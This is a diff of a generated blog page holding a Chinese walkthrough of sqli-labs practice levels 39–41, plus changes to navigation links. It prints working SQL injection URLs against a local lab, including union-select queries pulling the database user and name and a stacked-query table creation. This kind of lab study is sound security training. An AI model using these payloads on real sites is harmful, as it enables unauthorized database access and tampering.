@@ -184,7 +184,8 @@
         <div class="row">
             <!-- Post Container -->
             <div class="col-lg-8 col-lg-offset-1 col-sm-9 post-container">
-                <h1 id="Sqli-labs实验Task3（less39-53）"><a href="#Sqli-labs实验Task3（less39-53）" class="headerlink" title="Sqli-labs实验Task3（less39-53）"></a>Sqli-labs实验Task3（less39-53）</h1><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>这个没有闭合的，所以直接使用联合查询：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-39/?id=0 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+                <p><meta name="referrer" content="no-referrer"></p>
+<h1 id="Sqli-labs实验Task3（less39-53）"><a href="#Sqli-labs实验Task3（less39-53）" class="headerlink" title="Sqli-labs实验Task3（less39-53）"></a>Sqli-labs实验Task3（less39-53）</h1><h2 id="Less-39"><a href="#Less-39" class="headerlink" title="Less-39"></a>Less-39</h2><p>这个没有闭合的，所以直接使用联合查询：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-39/?id=0 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Less-40"><a href="#Less-40" class="headerlink" title="Less-40"></a>Less-40</h2><p>不同的闭合，多尝试几次。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-40/?id=0<span class="string">') union select 1,user(),database() -- #</span></span><br></pre></td></tr></table></figure></p>
 <h2 id="Less-41"><a href="#Less-41" class="headerlink" title="Less-41"></a>Less-41</h2><p>和39一样：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=0 union select 1,user(),database() -- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
 <p>但是page-3里的肯定不会这么简单，看了看page-3的标题，这是叠加注入，那就得在搞点其他的测试了，就用less-41来试一试：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ http://127.0.0.1/sqli-labs-master/Less-41/?id=1;create table <span class="built_in">test</span> like users;-- <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
@@ -215,9 +216,13 @@
 
                 <ul class="pager">
                     
+                    <li class="previous">
+                        <a href="/2019/04/15/27.企业微信告警以及回调/" data-toggle="tooltip" data-placement="top" title="企业微信告警和回调">&larr; Previous Post</a>
+                    </li>
+                    
                     
                     <li class="next">
-                        <a href="/2019/04/15/29.python3 windows校园网自动拨号/" data-toggle="tooltip" data-placement="top" title="python3 windows校园网自动拨号">Next Post &rarr;</a>
+                        <a href="/2019/04/15/21. PCI-DSS(V3.2.1)学习笔记(八)/" data-toggle="tooltip" data-placement="top" title="PCI-DSS(V3.2)学习笔记(八)">Next Post &rarr;</a>
                     </li>
                     
                 </ul>
